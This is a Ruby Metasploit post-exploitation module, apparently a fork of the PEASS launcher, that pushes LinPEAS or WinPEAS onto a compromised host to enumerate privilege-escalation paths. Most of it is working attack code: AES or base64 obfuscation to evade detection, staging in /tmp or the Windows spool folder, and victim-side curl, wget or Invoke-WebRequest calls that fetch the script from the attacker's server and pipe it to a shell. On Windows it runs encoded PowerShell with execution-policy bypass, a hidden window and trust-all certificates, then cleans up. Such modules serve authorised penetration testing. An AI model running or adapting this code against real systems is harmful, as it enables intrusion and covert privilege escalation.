##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'
require 'net/http'
require 'base64'
require 'openssl'
require 'tempfile'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi PASS launcher',
      'Description'    => %q{
          This module will launch the indicated PASS (Privilege Escalation Awesome Script Suite) script to enumerate the system.
          You need to indicate the URL or local path to LinPEAS if you are on any Unix-based system or to WinPEAS if you are on Windows.
          By default this script will upload the PASS script to the host (encrypted and/or encoded) and will load, deobfuscate, and execute it.
          You can configure this module to download the encrypted/encoded PASS script from this metasploit instance via HTTP instead of uploading it.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Carlos Polop <@khulnasoft>'
        ],
      'Platform'       => %w{ bsd linux osx unix win },
      'SessionTypes'   => ['shell', 'meterpreter'],
      'References' =>
          [
            ['URL', 'https://github.com/khulnasoft/PASS-ng'],
            ['URL', 'https://www.youtube.com/watch?v=9_fJv_weLU0'],
          ]
    ))
    register_options(
      [
        OptString.new('PASS_URL', [true, 'Path to the PASS script. Accepted: http(s):// URL or absolute local path. Linpeas: https://github.com/khulnasoft/PASS-ng/releases/latest/download/linpeas.sh', "https://github.com/khulnasoft/PASS-ng/releases/latest/download/winPEASany_ofs.exe"]),
        OptString.new('PASSWORD', [false, 'Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used.', rand(36**32).to_s(36)]),
        OptString.new('TEMP_DIR', [false, 'Path to upload the obfuscated PASS script inside the compromised machine. By default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp" in Unix.', '']),
        OptString.new('PARAMETERS', [false, 'Parameters to pass to the script', nil]),
        OptString.new('TIMEOUT', [false, 'Timeout of the execution of the PASS script (15min by default)', 15*60]),
        OptString.new('SRVHOST', [false, 'Set your metasploit instance IP if you want to download the PASS script from here via http(s) instead of uploading it.', '']),
        OptString.new('SRVPORT', [false, 'Port to download the PASS script from using http(s) (only used if SRVHOST)', 443]),
        OptString.new('SSL', [false, 'Indicate if you want to communicate with https (only used if SRVHOST)', true]),
        OptString.new('URIPATH', [false, 'URI path to download the script from there (only used if SRVHOST)', "/" + rand(36**4).to_s(36) + ".txt"])
      ])
    
    @temp_file_path = ""
  end

  def run
    ps_var1 = rand(36**5).to_s(36) # Winpeas PS needed variable

    # Load PASS script in memory
    pass_script = load_pass()
    print_good("PASS script successfully retrieved.")

    # Obfuscate loaded PASS script
    if datastore["PASSWORD"].length > 1
      # If no Windows, check if openssl exists
      if !session.platform.include?("win")
        openssl_path = cmd_exec("command -v openssl")
        raise 'openssl not found on victim, unset the password of the module!' unless openssl_path.include?("openssl")
      end

      # Get encrypted PASS script in B64
      print_status("Encrypting PASS and encoding it in Base64...")
      
      # Needed code to decrypt from unix
      if !session.platform.include?("win")
        aes_enc_pass_ret = aes_enc_pass(pass_script)
        pass_script_64 = aes_enc_pass_ret["encrypted"]
        key_hex = aes_enc_pass_ret["key_hex"]
        iv_hex = aes_enc_pass_ret["iv_hex"]
        decode_linpass_cmd = "openssl aes-256-cbc -base64 -d -K #{key_hex} -iv #{iv_hex}"
      
      # Needed code to decrypt from Windows
      else
        # As the PS function is only capable of decrypting readable strings
        # in Windows we encrypt the B64 of the binary and then load it in memory 
        # from the initial B64. Then: original -> B64 -> encrypt -> B64
        aes_enc_pass_ret = aes_enc_pass(Base64.encode64(pass_script)) # Base64 before encrypting it
        pass_script_64 = aes_enc_pass_ret["encrypted"]
        key_b64 = aes_enc_pass_ret["key_b64"]
        iv_b64 = aes_enc_pass_ret["iv_b64"]
        load_winpeas = get_ps_aes_decr()
        
        ps_var2 = rand(36**6).to_s(36)
        load_winpeas += "$#{ps_var2} = DecryptStringFromBytesAes \"#{key_b64}\" \"#{iv_b64}\" $#{ps_var1};"
        load_winpeas += "$#{rand(36**7).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var2}));"
      end
    
    else
      # If no Windows, check if base64 exists
      if !session.platform.include?("win")
        base64_path = cmd_exec("command -v base64")
        raise 'base64 not found on victim, set a 32B length password!' unless base64_path.include?("base64")
      end

      # Encode PASS script
      print_status("Encoding PASS in Base64...")
      pass_script_64 = Base64.encode64(pass_script)

      # Needed code to decode it in Unix and Windows
      decode_linpass_cmd = "base64 -d"
      load_winpeas = "$#{rand(36**6).to_s(36)} = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($#{ps_var1}));"
    
    end
    
    # Write obfuscated PASS to a local file
    file = Tempfile.new('pass_metasploit')
    file.write(pass_script_64)
    file.rewind
    @temp_file_path = file.path

    if datastore["SRVHOST"] == ""
      # Upload file to victim
      temp_pass_name = rand(36**5).to_s(36)
      if datastore["TEMP_DIR"] != ""
        temp_path = datastore["TEMP_DIR"]
        if temp_path[0] == "/"
          temp_path = temp_path + "/#{temp_pass_name}"
        else
          temp_path = temp_path + "\\#{temp_pass_name}"
        end
      
      elsif session.platform.include?("win")
        temp_path = "C:\\Windows\\System32\\spool\\drivers\\color\\#{temp_pass_name}"
      else
        temp_path = "/tmp/#{temp_pass_name}"
      end
      
      print_status("Uploading obfuscated pass to #{temp_path}...")
      upload_file(temp_path, file.path)
      print_good("Uploaded")

      # Start the cmd, prepare to read from the uploaded file
      if session.platform.include?("win")
        cmd = "$ProgressPreference = 'SilentlyContinue'; $#{ps_var1} = Get-Content -Path #{temp_path};"
        last_cmd = "del #{temp_path};"
      else
        cmd = "cat #{temp_path}"
        last_cmd = " ; rm #{temp_path}"
      end

    # Instead of writing the file to disk, download it from HTTP
    else
      last_cmd = ""
      # Start HTTP server
      start_service()

      http_protocol = datastore["SSL"] ? "https://" : "http://"
      http_ip = datastore["SRVHOST"]
      http_port = ":#{datastore['SRVPORT']}"
      http_path = datastore["URIPATH"]
      url_download_pass = http_protocol + http_ip + http_port + http_path      
      print_good("Listening in #{url_download_pass}")
      
      # Configure the download of the script in Windows
      if session.platform.include?("win")
        cmd = "$ProgressPreference = 'SilentlyContinue';"
        cmd += get_bypass_tls_cert()
        cmd += "$#{ps_var1} = Invoke-WebRequest \"#{url_download_pass}\" -UseBasicParsing | Select-Object -ExpandProperty Content;"
      
      # Configure the download of the script in Unix
      else
        cmd = "curl -k -s \"#{url_download_pass}\""
        curl_path = cmd_exec("command -v curl")
        if ! curl_path.include?("curl")
          cmd = "wget --no-check-certificate -q -O - \"#{url_download_pass}\""
          wget_path = cmd_exec("command -v wget")
          raise 'Neither curl nor wget were found in victim, unset the SRVHOST option!' unless wget_path.include?("wget")
        end
      end
    end
    
    # Run PASS script
    begin
      tmpout = "\n"
      print_status "Running PASS..."

      # If Windows, suppose Winpeas was loaded
      if session.platform.include?("win")
        cmd += load_winpeas
        cmd += "$a = [winPEAS.Program]::Main(\"#{datastore['PARAMETERS']}\");"
        cmd += last_cmd
        # Transform to Base64 in UTF-16LE format
        cmd_utf16le = cmd.encode("utf-16le")
        cmd_utf16le_b64 = Base64.encode64(cmd_utf16le).gsub(/\r?\n/, "")
        
        tmpout << cmd_exec("powershell.exe", args="-ep bypass -WindowStyle hidden -nop -enc #{cmd_utf16le_b64}", time_out=datastore["TIMEOUT"].to_i)
      
        # If Unix, then, suppose linpeas was loaded
      else
        cmd += "| #{decode_linpass_cmd}"
        cmd += "| sh -s -- #{datastore['PARAMETERS']}"
        cmd += last_cmd
        tmpout << cmd_exec(cmd, args=nil, time_out=datastore["TIMEOUT"].to_i)
      end

      print "\n#{tmpout}\n\n"
      command_log = store_loot("PASS", "text/plain", session, tmpout, "pass.txt", "PASS script execution")
      print_good("PASS output saved to: #{command_log}")
    
    rescue ::Exception => e
      print_bad("Error Running PASS: #{e.class} #{e}")
    end
    
    # Close and delete the temporary file
    file.close
    file.unlink
  end

  def on_request_uri(cli, request)
    print_status("HTTP request received")
    send_response(cli, File.read(@temp_file_path), {'Content-Type'=>'text/plain'})
    print_good("PASS script sent")
  end

  def fetch(uri_str, limit = 10)
    raise 'Invalid URL, too many HTTP redirects' if limit == 0
    response = Net::HTTP.get_response(URI(uri_str))
    case response
    when Net::HTTPSuccess then
      response
    when Net::HTTPRedirection then
      location = response['location']
      fetch(location, limit - 1)
    else
      response.value
    end
  end
 
  def load_pass
    # Load the PASS script from a local file or from Internet
    pass_script = ""
    url_pass = datastore['PASS_URL']
    
    if url_pass.include?("http://") || url_pass.include?("https://")
      target = URI.parse url_pass
      raise 'Invalid URL' unless target.scheme =~ /https?/
      raise 'Invalid URL' if target.host.to_s.eql? ''
      
      res = fetch(target)
      pass_script = res.body

      raise "Something failed downloading PASS script from #{url_pass}" if pass_script.length < 500

    else
      raise "PASS local file (#{url_pass}) does not exist!" unless ::File.exist?(url_pass)        
      pass_script = File.read(url_pass)
      raise "Something falied reading PASS script from #{url_pass}" if pass_script.length < 500
    end

    return pass_script
  end

  def aes_enc_pass(pass_script)
    # Encrypt the PASS script with AES (CBC Mode)
    key = datastore["PASSWORD"]
    iv = OpenSSL::Cipher::Cipher.new('aes-256-cbc').random_iv
    
    c = OpenSSL::Cipher.new('aes-256-cbc').encrypt
    c.iv = iv
    c.key = key
    encrypted = c.update(pass_script) + c.final
    encrypted = [encrypted].pack('m')

    return {
      "encrypted" => encrypted,
      "key_hex" => key.unpack('H*').first,
      "key_b64" => Base64.encode64(key).strip,
      "iv_hex" => iv.unpack('H*').first,
      "iv_b64" => Base64.encode64(iv).strip
    }
  end

  def get_bypass_tls_cert
    return'
    # Code to accept any certificate in the https connection from https://stackoverflow.com/questions/11696944/powershell-v3-invoke-webrequest-https-error
    add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;
'
  end

  def get_ps_aes_decr
    # PS code to decrypt Winpeas
    return '
    # Taken from https://gist.github.com/Darryl-G/d1039c2407262cb6d735c3e7a730ee86
function DecryptStringFromBytesAes([String] $key, [String] $iv, [String] $encrypted) {
    [byte[]] $encrypted = [Convert]::FromBase64String($encrypted);
    [byte[]] $key = [Convert]::FromBase64String($key)
    [byte[]] $iv = [Convert]::FromBase64String($iv)

    # Declare the stream used to encrypt to an in memory
    # array of bytes.
    [System.IO.MemoryStream] $msDecrypt

    # Declare the RijndaelManaged object
    # used to encrypt the data.
    [System.Security.Cryptography.RijndaelManaged] $aesAlg = new-Object System.Security.Cryptography.RijndaelManaged

    [String] $plainText=""

    try  {
        # Create a RijndaelManaged object
        # with the specified key and IV.
        $aesAlg =  new-object System.Security.Cryptography.RijndaelManaged
        $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesAlg.KeySize = 256
        $aesAlg.BlockSize = 128
        $aesAlg.key = $key
        $aesAlg.IV = $iv

        # Create an encryptor to perform the stream transform.
        [System.Security.Cryptography.ICryptoTransform] $decryptor = $aesAlg.CreateDecryptor($aesAlg.Key, $aesAlg.IV);

        # Create the streams used for encryption.
        $msDecrypt = new-Object System.IO.MemoryStream @(,$encrypted)
        $csDecrypt = new-object System.Security.Cryptography.CryptoStream($msDecrypt, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $srDecrypt = new-object System.IO.StreamReader($csDecrypt)

        # Write all data to the stream.
        $plainText = $srDecrypt.ReadToEnd()
        $srDecrypt.Close()
        $csDecrypt.Close()
        $msDecrypt.Close()
    }
    finally {
        # Clear the RijndaelManaged object.
        if ($aesAlg -ne $null){
            $aesAlg.Clear()
        }
    }

    # Return the Decrypted bytes from the memory stream.
    return $plainText
}
'
  end
end
